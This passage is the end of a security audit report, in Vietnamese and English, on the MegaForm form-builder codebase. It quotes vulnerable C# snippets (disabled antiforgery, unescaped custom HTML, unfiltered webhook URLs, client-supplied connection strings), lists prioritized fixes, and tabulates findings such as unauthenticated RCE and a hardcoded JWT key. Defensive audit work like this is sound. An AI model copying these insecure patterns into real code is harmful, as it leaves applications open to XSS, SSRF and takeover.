**File:** `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs`

```csharp
[IgnoreAntiforgeryToken]
[Route("api/[controller]")]
public class MegaFormController : ControllerBase
{
    [HttpPost("Form")]
    [Authorize(Policy = "EditModule")]
    public IActionResult SaveForm([FromBody] JObject body) { ... }
}
```

**Nhận xét:** Class-level attribute vô hiệu hóa antiforgery cho tất cả action, bao gồm cả admin write endpoints.

### 6.7 `FormHtmlRenderer` — Stored XSS Surface

**File:** `MegaForm.Core/Services/FormHtmlRenderer.cs`

```csharp
html = Regex.Replace(html, @"\{\{content:([a-zA-Z0-9_\-]+)\}\}", m =>
{
    var key = m.Groups[1].Value;
    return content.TryGetValue(key, out var v) ? (v ?? string.Empty) : string.Empty;
});
```

**Nhận xét:** `content` từ `settings.CustomContent` được chèn trực tiếp mà không escape/sanitize.

### 6.8 Workflow Webhook SSRF

**File:** `MegaForm.Core/Workflow/WebhookNodeExecutor.cs`

```csharp
var url = ResolveTemplate(config.Url, context);
...
using var response = await _httpClient.SendAsync(request);
```

**File:** `MegaForm.Core/Services/WebhookService.cs`

```csharp
public async Task SendRawWebhookAsync(string url, HttpMethod method, string body, ...)
{
    using var request = new HttpRequestMessage(method, url);
    ...
}
```

**Nhận xét:** URL được resolve từ template chứa form data. Không có whitelist/filter nội bộ.

### 6.9 `TestDatabaseSettings` — Arbitrary Connection String

**File:** `MegaForm.Web/Controllers/MegaFormController.cs`

```csharp
[HttpPost("ModuleConfig/DatabaseSettings/Test")]
public IActionResult TestDatabaseSettings([FromBody] JObject body)
{
    var provider = body.Value<string>("provider");
    var connectionString = body.Value<string>("connectionString");
    var result = _dbMetadata.TestConnection(null, provider, connectionString);
    return Ok(result);
}
```

**Nhận xét:** Mở real DB connection với connection string do client cung cấp.

---

## 7. Recommendations

### P0 — Immediate Actions

1. **Oqtane `MegaFormLocalAiController`:**
   - Thêm env gate `MEGAFORM_ALLOW_LOCAL_AI_CLI=1` giống Web.
   - Yêu cầu `[Authorize]` hoặc `[Authorize(Roles = "Administrator")]`.
   - Dùng `ArgumentList` thay vì `Arguments` string.

2. **Oqtane i18n write endpoints:**
   - Thêm `[Authorize(Roles = "Administrator")]` hoặc `[Authorize(Policy = "EditModule")]`.
   - Validate path, không cho phép overwrite `index.json` hoặc file ngoài `js/builder/i18n/`.

3. **Roslyn compile:**
   - Giữ Host-only gate.
   - Chạy trong sandbox/AppDomain riêng với whitelist API.
   - Audit log mọi compile action.

4. **JWT configuration:**
   - Sinh key ngẫu nhiên trong setup wizard.
   - Lưu trong environment variable hoặc secret manager.
   - Bật `ValidateIssuer = true`, `ValidateAudience = true`.

5. **Web `SavePrintSettings`:**
   - Thêm `[Authorize(Roles = "Administrator")]`.
   - Kiểm tra ownership form.
   - Validate/encode `PrintSettings`.

6. **Stored XSS surfaces:**
   - Dùng HTML sanitizer whitelist (HtmlSanitizer) cho RichText/Html fields.
   - Escape CSS đặc biệt `<`, `"`, `'`.

### P1 — High Priority

7. **CSRF:**
   - Bỏ class-level `[IgnoreAntiforgeryToken]`.
   - Chỉ đặt trên các endpoint public submit/upload thực sự cần.
   - Đảm bảo client gửi antiforgery token cho admin POST.

8. **Local CLI chat:**
   - Giữ env gate.
   - Thêm timeout ngắn.
   - Whitelist commands.
   - Không cho phép shell metacharacters.

9. **DDL guard:**
   - Sử dụng SQL parser thực sự thay vì regex.
   - Thêm prepared statements.
   - Chỉ cho phép whitelist statement/table.

10. **SSRF webhook:**
    - Validate URL sau khi resolve.
    - Deny private IP ranges, localhost, metadata endpoints.
    - Dùng allow-list domain.

11. **Database connection test:**
    - Không cho phép test connection string tùy ý.
    - Chỉ cho phép test connection đã lưu server-side hoặc masked.

12. **Public upload:**
    - Khôi phục gate `IsPublished` cho form draft.
    - Hoặc yêu cầu auth.
    - Validate content-type/extension chặt.
    - Scan malware.

13. **UserTemplate SSTI:**
    - Hạn chế quyền edit template chỉ Host/Admin.
    - Sandbox interpreter.
    - Giới hạn reflection.

### P2/P3 — Medium/Low Priority

14. `Files/Download`: Dùng `Path.GetFullPath` + prefix containment.
15. CORS: Giới hạn origin cụ thể; cookie `SecurePolicy=Always` trong production.
16. Error handling: Trả generic message client-side; log chi tiết server-side.
17. `TrustServerCertificate` và `EnableSsl`: Đặt production defaults an toàn.
18. AI API key: Không trả về client; dùng server-side proxy.
19. PII: Dùng placeholder trong file config mẫu.
20. QA/Doc credentials: Thay bằng biến môi trường; xóa khỏi git history.

---

## 8. Regulatory Mapping

| Regulation | Findings liên quan |
|------------|--------------------|
| **DORA** | P0-1, P0-2, P0-3, P0-4, P0-5, P0-6, P1-1, P1-2, P1-3 (ICT risk management, incident reporting, security testing) |
| **NIS2** | P0-1, P0-2, P0-4, P0-5, P0-6, P1-1, P1-4, P1-5, P1-6, P2-2, P2-3, P2-4 (security of network and information systems) |
| **CRA** | P0-1, P0-2, P0-3, P0-4 (product security, no unsafe defaults, vulnerability management) |

---

## 9. Appendix A — Full Deduplicated Finding List

| ID | Finding | File | Mythos Severity | Exploitability | Status |
|----|---------|------|-----------------|----------------|--------|
| P0-1 | Unauthenticated RCE `kimi` CLI | `MegaForm.Oqtane.Server/Controllers/MegaFormLocalAiController.cs` | Critical | Unauthenticated | Confirmed |
| P0-2 | Unauthenticated i18n file write | `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs` | Critical | Unauthenticated | Confirmed |
| P0-3 | Roslyn JIT compile RCE | `MegaForm.Oqtane.Server/Controllers/RazorWidgetController.cs` | Critical | Authenticated Host | Confirmed |
| P0-4 | Hardcoded JWT key + weak validation | `MegaForm.Web/appsettings.Production.json`, `Program.cs` | Critical | Unauthenticated | Confirmed |
| P0-5 | Unauthenticated `SavePrintSettings` | `MegaForm.Web/Controllers/PrintController.cs` | Critical | Unauthenticated | Confirmed |
| P0-6 | Stored XSS via CustomHtml/ModuleCss | `MegaForm.Core/Services/FormHtmlRenderer.cs`, `ModuleCssComposer.cs` | Critical | Authenticated Admin | Confirmed |
| P1-1 | CSRF class-level Oqtane | `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs` | High | CSRF | Confirmed |
| P1-2 | Admin shell-out `claude` CLI | `MegaForm.Web/Controllers/AiAssistantController.cs` | High | Authenticated Admin | Confirmed |
| P1-3 | Admin SQL/DDL execution | `MegaForm.Oqtane.Server/Controllers/AiToolsController.cs` | High | Authenticated Admin | Confirmed |
| P1-4 | SSRF workflow webhook | `MegaForm.Core/Workflow/WebhookNodeExecutor.cs` | High | Authenticated User/Admin | Confirmed |
| P1-5 | Arbitrary connection string | `MegaForm.Web/Controllers/MegaFormController.cs` | High | Authenticated User | Confirmed |
| P1-6 | Public upload draft form | `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs` | High | Unauthenticated/User | Confirmed |
| P1-7 | UserTemplate SSTI | `MegaForm.Oqtane.Server/Controllers/UserTemplateController.cs` | High | Authenticated User | Confirmed |
| P2-1 | Path sanitization yếu | `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs` | Medium | Authenticated User | Confirmed |
| P2-2 | AI API key leak to client | `MegaForm.Web/Controllers/AiAssistantController.cs` | Medium | Authenticated Admin | Confirmed |
| P2-3 | Verbose error leak | Nhiều controller | Medium | Unauthenticated/Auth | Confirmed |
| P2-4 | CORS wildcard + cookie SameAsRequest | `MegaForm.Web/Program.cs` | Medium | CSRF/MitM | Confirmed |
| P2-5 | DDL guard nested comment bypass | `MegaForm.Core/Services/AiAssistant/SqlDdlGuard.cs` | Medium | Authenticated Admin | Potential |
| P3-1 | TrustServerCertificate=true | `MegaForm.Web/appsettings.json` | Low | MitM | Confirmed |
| P3-2 | SMTP EnableSsl=false | `MegaForm.Web/appsettings.json` | Low | MitM | Confirmed |
| P3-3 | PII admin email in config | `MegaForm.Web.Host/appsettings.Production.json` | Low | Info disclosure | Confirmed |
| QA-1 | Hardcoded QA passwords in Index.razor | `MegaForm.Oqtane.Client/Index.razor` | Misconfig | N/A | QA fixture |
| QA-2 | Sample project admin password | `Samples/CorporateWeb/SetupCompletionService.cs` | Misconfig | N/A | Sample only |
| QA-3 | Hardcoded passwords in QA scripts | `qa5000/*.mjs`, `MegaForm.UI/scripts/*.mjs` | Misconfig | N/A | Dev/QA scripts |
| QA-4 | Credentials in docs/handoff | `Docs/CLAUDE_HANDOFF_*.md` | Misconfig | N/A | Documentation |

---

## 10. Appendix B — Mythos Assessment Methodology Notes

### 10.1 Scope
- Rà soát toàn bộ source code trong `MegaFormSolution_280_Oqtane_um`.
- Bao gồm các project: `MegaForm.Core`, `MegaForm.Web`, `MegaForm.Web.Host`, `MegaForm.Oqtane.Server`, `MegaForm.Oqtane.Client`, `MegaForm.DNN`, `MegaForm.UI`, `MegaForm.Premium.AspNetCore`, `MegaForm.Umbraco`.
- Không bao gồm runtime testing, dependency CVE scan, hoặc infrastructure pentest.

### 10.2 Limitations
- Phân tích dựa trên static code review; exploitability có thể khác trên môi trường thực tế.
- Một số findings đánh dấu `Potential` cần thêm validation qua dynamic testing.
- Các lỗ hổng phụ thuộc vào cấu hình deploy (env vars, permissions, network topology).

### 10.3 Tools & Techniques
- Mythos Attack Surface Mapping (file ranking 1–5).
- Parallel agentic discovery theo lớp lỗ hổng.
- Judge triage để deduplicate, validate, chain, re-prioritize.
- Grep/ReadFile pattern-based review cho evidence.

---

## 11. Conclusion

Codebase MegaForm có **6 lỗ hổng P0 nghiêm trọng**, trong đó 3 lỗ hổng unauthenticated. Các lỗ hổng tập trung chủ yếu ở:
- **Oqtane Server:** unauthenticated RCE (`kimi` CLI), unauthenticated file write (i18n), Host/Admin RCE (Roslyn compile).
- **Web Host:** unauthenticated schema mutation (`SavePrintSettings`), hardcoded JWT key.
- **Shared Core:** stored XSS surfaces, SSRF webhook, weak path sanitization.

Cần ưu tiên sửa các lỗ hổng P0 trước khi triển khai production hoặc release bản cập nhật mới.

---

*End of Report*
